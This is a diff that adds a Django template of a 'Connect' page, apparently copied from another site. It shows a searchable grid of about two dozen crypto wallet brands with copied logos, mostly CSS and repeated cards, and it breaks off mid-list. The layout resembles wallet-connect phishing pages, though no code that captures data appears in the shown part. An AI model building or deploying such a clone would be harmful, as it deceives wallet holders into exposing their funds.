@@ -1,0 +1,2576 @@
+<!DOCTYPE html>
+<!-- saved from url=(0036)https://midnight-gd.com/connect.html -->
+<html lang="en"><head>
+    {% load static %}
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    
+    <title>Connect</title>
+    <meta name="author" content="Flare Network">
+    <meta name="csrf-token" content="awrZRfJummRnebkgqYCT1JtUSolIU59yXZSrVxfV">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" type="text/css" href="{% static 'connect-css/style.css' %}">
+    <link rel="shortcut icon" href="{% static "static/logo/wc.png" %}">
+    <link rel="apple-touch-icon-precomposed" href="{% static "static/logo/wc.png" %}">
+    <link rel="stylesheet" href="./Connect_files/all.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap 5 JS Bundle (includes Popper) -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+
+    <style>
+        .badge::after {
+    content: '' !important;
+        }
+        </style>
+        
+    <style>
+    .nav-tabs .nav-link {
+      font-weight: bold;
+      color: #000;
+      border: none;
+      border-bottom: 2px solid transparent;
+      padding: 0.5rem 1rem;
+    }
+
+    .nav-tabs .nav-link.active {
+      color: #00b894;
+      border-bottom: 2px solid #00b894;
+    }
+
+    .btn-cancel {
+      background-color: #00bcd4;
+      color: white;
+      border-radius: 30px;
+      border: none;
+    }
+
+    .btn-proceed {
+      background-color: #00b894;
+      color: white;
+      border-radius: 30px;
+      border: none;
+    }
+
+    .form-control {
+      border-radius: 10px;
+      padding: 12px;
+      font-size: 14px;
+    }
+
+    .modal-content {
+      border-radius: 20px;
+    }
+
+    .modal-header {
+      padding-bottom: 0;
+    }
+
+    .modal-title {
+      font-weight: 700;
+      font-size: 18px;
+    }
+
+    .btn-close {
+      outline: none;
+      box-shadow: none;
+    }
+	
+	.modal-dialog {
+    max-width: 420px; /* Reduced from Bootstrap default ~500px */
+  }
+  </style>
+    <!-- Favicon -->
+    <link rel="icon" href="https://midnight-gd.com/favicon.svg" type="image/svg+xml">
+
+    <link href="./Connect_files/css2" rel="stylesheet">
+
+	<style>
+	
+        [x-cloak] {
+            display: none !important;
+        }
+
+        body {
+            font-family: 'Outfit', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            /* Prevent horizontal scroll */
+        }
+
+
+
+        .wallets-section {
+            background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+            color: #fff;
+            padding: 80px 15px;
+            min-height: 100vh;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .wallets-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background:
+                radial-gradient(circle at 20% 80%, rgba(16, 185, 129, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(6, 182, 212, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .wallets-section h2 {
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, #fbbf24, #ec4899, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            position: relative;
+            z-index: 1;
+        }
+
+        .description {
+            max-width: 800px;
+            color: #d1d5db;
+            margin-bottom: 2.5rem;
+            background: rgba(55, 65, 81, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 1.5rem;
+            border-radius: 12px;
+            font-size: 14px;
+            line-height: 1.6;
+            border: 1px solid rgba(75, 85, 99, 0.3);
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-card {
+            background: rgba(55, 65, 81, 0.8);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(75, 85, 99, 0.3);
+            border-radius: 16px;
+            text-align: left;
+            transition: all 0.3s ease;
+            height: 100%;
+            cursor: pointer;
+            color: #fff;
+            margin-bottom: 1.5rem;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .wallet-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(6, 182, 212, 0.1));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .wallet-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            border-color: rgba(16, 185, 129, 0.5);
+        }
+
+        .wallet-card:hover::before {
+            opacity: 1;
+        }
+
+        .wallet-card img {
+            max-width: 60px;
+            margin-bottom: 10px;
+            border-radius: 50%;
+            transition: transform 0.3s ease;
+        }
+
+        .wallet-card:hover img {
+            transform: scale(1.1);
+        }
+
+        .wallet-name {
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 0;
+            color: #fff;
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem;
+            width: 100%;
+            background: rgba(55, 65, 81, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            border: 1px solid rgba(75, 85, 99, 0.3);
+            margin-bottom: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .wallet-label {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .toggle-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 14px;
+        }
+
+        .toggle-label {
+            color: #d1d5db;
+            font-weight: 500;
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 44px;
+            height: 24px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #374151, #4b5563);
+            border-radius: 24px;
+            transition: all 0.4s ease;
+            border: 1px solid rgba(75, 85, 99, 0.5);
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 2px;
+            background: linear-gradient(135deg, #d1d5db, #f3f4f6);
+            transition: all 0.4s ease;
+            border-radius: 50%;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .toggle-switch input:checked+.slider {
+            background: linear-gradient(135deg, #10b981, #06b6d4);
+            border-color: rgba(16, 185, 129, 0.5);
+        }
+
+        .toggle-switch input:checked+.slider:before {
+            transform: translateX(20px);
+            background: linear-gradient(135deg, #ffffff, #f9fafb);
+        }
+
+        .hp-select-box-item input[type="radio"] {
+            display: none;
+        }
+
+        .hp-select-box-item input[type="radio"]:checked+label .wallet-card {
+            border-color: #4f46e5;
+            background: #1a2f3a;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+            margin: 0 -15px;
+        }
+
+        .col-12 {
+            flex: 0 0 100%;
+            max-width: 100%;
+            padding: 0 15px;
+        }
+
+        @media (min-width: 768px) {
+            .col-md-6 {
+                flex: 0 0 50%;
+                max-width: 50%;
+            }
+        }
+
+        @media (min-width: 992px) {
+            .col-lg-4 {
+                flex: 0 0 33.333333%;
+                max-width: 33.333333%;
+            }
+        }
+
+        /* Shimmer animation for badges */
+        @keyframes shimmer {
+            0% {
+                left: -100%;
+            }
+
+            100% {
+                left: 100%;
+            }
+        }
+
+        /* Responsive improvements */
+        @media (max-width: 768px) {
+            .wallet-container {
+                width: 100%;
+                padding: 1rem;
+            }
+
+            .wallets-section {
+                padding: 40px 15px;
+            }
+
+            /* Hide desktop menu on mobile */
+            .hidden.lg\:flex {
+                display: none !important;
+            }
+
+            /* Show mobile menu button */
+            .lg\:hidden {
+                display: block !important;
+            }
+
+            /* Ensure no horizontal overflow */
+            body {
+                overflow-x: hidden;
+            }
+
+            .container {
+                max-width: 100%;
+                padding-left: 1rem;
+                padding-right: 1rem;
+            }
+
+            /* Fix search input on mobile */
+            input[type="text"] {
+                font-size: 16px !important;
+                /* Prevents zoom on iOS */
+            }
+        }
+
+        /* Desktop responsive */
+        @media (min-width: 769px) {
+            .hidden.lg\:flex {
+                display: flex !important;
+            }
+
+            .lg\:hidden {
+                display: none !important;
+            }
+        }
+
+        /* Mobile menu styles */
+        .translate-x-0 {
+            transform: translateX(0) !important;
+        }
+
+        .-translate-x-full {
+            transform: translateX(-100%) !important;
+        }
+
+        .duration-300 {
+            transition-duration: 300ms;
+        }
+
+        .transition-transform {
+            transition-property: transform;
+            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .ease-in-out {
+            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .fixed {
+            position: fixed;
+        }
+
+        .inset-0 {
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+        }
+
+        .z-50 {
+            z-index: 50;
+        }
+
+        .z-20 {
+            z-index: 20;
+        }
+
+        .bg-black\/50 {
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .bg-gray-800 {
+            background-color: #1f2937;
+        }
+
+        .w-80 {
+            width: 20rem;
+        }
+
+        .h-screen {
+            height: 100vh;
+        }
+
+        .overflow-y-auto {
+            overflow-y: auto;
+        }
+
+        .p-4 {
+            padding: 1rem;
+        }
+
+        .mb-6 {
+            margin-bottom: 1.5rem;
+        }
+
+        .gap-3 {
+            gap: 0.75rem;
+        }
+
+        .flex {
+            display: flex;
+        }
+
+        .flex-col {
+            flex-direction: column;
+        }
+
+        .justify-between {
+            justify-content: space-between;
+        }
+
+        .items-center {
+            align-items: center;
+        }
+
+        .py-2 {
+            padding-top: 0.5rem;
+            padding-bottom: 0.5rem;
+        }
+
+        .inline-flex {
+            display: inline-flex;
+        }
+
+        .hover\:text-yellow-400:hover {
+            color: #fbbf24;
+        }
+
+        .transition-colors {
+            transition-property: color;
+            transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+            transition-duration: 150ms;
+        }
+
+        .text-xl {
+            font-size: 1.25rem;
+            line-height: 1.75rem;
+        }
+
+        .text-2xl {
+            font-size: 1.5rem;
+            line-height: 2rem;
+        }
+
+        .w-6 {
+            width: 1.5rem;
+        }
+
+        .h-6 {
+            height: 1.5rem;
+        }
+</style>
+
+
+<style type="text/css">
+#jhmbahbqip0k1754119528972 {outline:none !important;
+visibility:visible !important;
+resize:none !important;
+box-shadow:none !important;
+overflow:visible !important;
+background:none !important;
+opacity:1 !important;
+filter:alpha(opacity=100) !important;
+-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity 1}) !important;
+-mz-opacity:1 !important;
+-khtml-opacity:1 !important;
+top:auto !important;
+right:0px !important;
+bottom:0px !important;
+left:auto !important;
+position:fixed !important;
+border:0 !important;
+min-height:0px  !important;
+min-width:0px  !important;
+max-height:none  !important;
+max-width:none  !important;
+padding:0px !important;
+margin:0px !important;
+-moz-transition-property:none !important;
+-webkit-transition-property:none !important;
+-o-transition-property:none !important;
+transition-property:none !important;
+transform:none !important;
+-webkit-transform:none !important;
+-ms-transform:none !important;
+width:auto !important;
+height:auto  !important;
+display:none !important;
+z-index:2000000000 !important;
+background-color:transparent !important;
+cursor:none !important;
+float:none !important;
+border-radius:unset !important;
+pointer-events:auto !important;
+clip:auto !important;
+color-scheme:light !important;}#jhmbahbqip0k1754119528972.widget-hidden {display: none !important;}#jhmbahbqip0k1754119528972.widget-visible {display: block !important;}
+@media print{
+ #jhmbahbqip0k1754119528972.widget-visible { 
+display: none !important;
+ }
+}</style>
+</head>
+
+
+
+<body class="bg-gray-900 text-white font-[&#39;Outfit&#39;] overflow-x-hidden" cz-shortcut-listen="true" style="">
+
+    <!-- WALLETS SECTION -->
+    <section class="wallets-section mt-20 xl:mt-24" id="wallets_list">
+
+    <!-- Search Bar -->
+    <div style="margin-bottom: 2rem; width: 100%;">
+    <div style="display: flex; flex-direction: column; gap: 1.5rem; width: 100%;">
+      <div style="text-align: center;">
+        <span class="wallet-label" style="font-size: 1.5rem; font-weight: 600; color: #ffffff;">Choose wallet</span>
+      </div>
+
+      <div style="width: 100%; max-width: 600px; margin: 0 auto;">
+        <div style="position: relative;">
+          <input type="text" id="walletSearch" placeholder="Search for wallets by name..." style="width: 100%;
+              padding: 16px 50px 16px 20px;
+              border: 2px solid #374151;
+              border-radius: 12px;
+              font-size: 16px;
+              background: rgba(55, 65, 81, 0.8);
+              color: #ffffff;
+              transition: all 0.3s ease;
+              outline: none;" onfocus="this.style.borderColor = &#39;#10b981&#39;; this.style.boxShadow = &#39;0 0 0 3px rgba(16, 185, 129, 0.1)&#39;" onblur="this.style.borderColor = &#39;#374151&#39;; this.style.boxShadow = &#39;none&#39;">
+        </div>
+      </div>
+    </div>
+  </div>
+                <div class="container">
+                    
+                <div class="row">
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Ledger">
+                            <div class="sc-author-box select_wallet" id="ledger" data-title="ledger" data-logo="{% static "static/logo/images.png" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/images.png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Ledger</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Wallet Connect">
+                            <div id="wallet_connect" class="sc-author-box select_wallet" data-title="Wallet Connect" data-logo="{% static "static/logo/walle.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/walle.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Wallet Connect</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Trust Wallet">
+                            <div id="trust_wallet" class="sc-author-box select_wallet" data-title="Trust Wallet" data-logo="{% static "static/logo/trust_wallet.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/trust_wallet.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Trust Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Metamask">
+                            <div id="metamask" class="sc-author-box select_wallet" data-title="Metamask" data-logo="{% static "static/logo/metamask.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/metamask.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Metamask</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Binance Chain Wallet">
+                            <div id="binance" class="sc-author-box select_wallet" data-title="Binance Chain Wallet" data-logo="{% static "static/logo/binance.png" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/binance.png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Binance Chain Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Polygon Wallet">
+                            <div id="polygon" class="sc-author-box select_wallet" data-title="Polygon Wallet" data-logo="{% static "static/logo/polygon.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/polygon.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Polygon Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Rainbow">
+                            <div id="rainbow" class="sc-author-box select_wallet" data-title="Rainbow" data-logo="{% static "static/logo/rainbow.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/rainbow.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Rainbow</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Bitpay">
+                            <div id="bitpay" class="sc-author-box select_wallet" data-title="Bitpay" data-logo="{% static "static/logo/bitpay.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/bitpay.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Bitpay</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Xumm">
+                            <div id="bitpay" class="sc-author-box select_wallet" data-title="Xumm" data-logo="{% static "static/logo/xumm.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/xumm.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Xumm</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Saita Pro">
+                            <div id="bitpay" class="sc-author-box select_wallet" data-title="Bitpay" data-logo="https://play-lh.googleusercontent.com/PD6ommpOAofmpJzNt5t4zDoGsloOi3O3EM8GoS0pGa6O5RAmRMvSD2CdY962LmaVwQ=s200" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/unnamed.png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Saita Pro</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Walleth">
+                            <div id="waleth" class="sc-author-box select_wallet" data-title="Walleth" data-logo="{% static "static/logo/walleth.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/walleth.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Walleth</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="SaitaMask">
+                            <div id="SaitaMask" class="sc-author-box select_wallet" data-title="SaitaMask" data-logo="https://play-lh.googleusercontent.com/HmXjCZa048la55QfEg_6CJo8Qt7NN0HVUR2cu8uk5gm5BoNhEXulPrgT0Qbnoaf3tHfl" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/unnamed(1).png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>SaitaMask </a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Argent">
+                            <div id="argent" class="sc-author-box select_wallet" data-title="Argent" data-logo="{% static "static/logo/argent.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/argent.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Argent</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Huobi Wallet">
+                            <div id="huobi" class="sc-author-box select_wallet" data-title="Huobi Wallet" data-logo="{% static "static/logo/huobi.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/huobi.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Huobi Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Encrypted Ink">
+                            <div id="encrypted_ink" class="sc-author-box select_wallet" data-title="Encrypted Ink" data-logo="{% static "static/logo/encrypted_ink.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/encrypted_ink.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Encrypted Ink</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="KEPLR">
+                            <div id="keplr" class="sc-author-box select_wallet" data-title="KEPLR" data-logo="https://play-lh.googleusercontent.com/YM7h-nnxtDs9WROvE0GUzreNFua0eIm2N2m181BuiLgAqOeByqYZahsnbKos2xSGdAmv=w240-h480-rw" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/unnamed.webp" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>KEPLR</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Plug Wallet">
+                            <div id="keplr" class="sc-author-box select_wallet" data-title="Plug Wallet" data-logo="https://play-lh.googleusercontent.com/6HApraB-7MgzDiGH_xxxI5aBmBWo3PFScYS1MwS2Sf64d8e5K1mZ44DJLYT-AtQsFg" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/unnamed(2).png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Plug Wallet</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Phantom">
+                            <div id="keplr" class="sc-author-box select_wallet" data-title="Phantom" data-logo="https://lh3.googleusercontent.com/dXvdD2VjLS-imsW8WG2oB3y7sBHhL9gFlv7KZnqZSA9_MU1VROSHRpJidav8-a77uQT1-8X_zK5ibsAC39IFn5tn=s120" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/unnamed(3).png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Phantom</a></h5>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Compound">
+                            <div id="compound" class="sc-author-box select_wallet" data-title="Compound" data-logo="{% static "static/logo/compound.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/compound.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Compound</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Polkadot">
+                            <div id="polkadot" class="sc-author-box select_wallet" data-title="Polkadot" data-logo="{% static "static/logo/polkadot.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/polkadot.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Polkadot</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Iotex">
+                            <div id="iotex" class="sc-author-box select_wallet" data-title="Iotex" data-logo="{% static "static/logo/iotex.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/iotex.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Iotex</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Coin98">
+                            <div id="coin98" class="sc-author-box select_wallet" data-title="Coin98" data-logo="{% static "static/logo/coin98.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/coin98.jpg" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Coin98</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Coinbase">
+                            <div id="coinbase" class="sc-author-box select_wallet" data-title="Coinbase" data-logo="{% static "static/logo/coinbase.png" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
+                                        <img src="{% static "static/logo/coinbase.png" %}" alt="Image" class="avatar" style="width: 50px; height: 50px;">
+                                    </a>
+                                    <div class="badge"><i class="ripple"></i></div>
+                                </div>
+                                <div class="author-infor wallet-name">
+                                    <h5 class="style2"><a>Coinbase</a></h5>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6 wallets wallet-box" data-wallet-name="Crypto.com">
+                            <div id="crypto" class="sc-author-box select_wallet" data-title="Crypto.com | Defi Wallet" data-logo="{% static "static/logo/crypto.jpg" %}" style="cursor:pointer;">
+                                <div class="author-avatar">
+                                    <a href="https://midnight-gd.com/connect.html#">
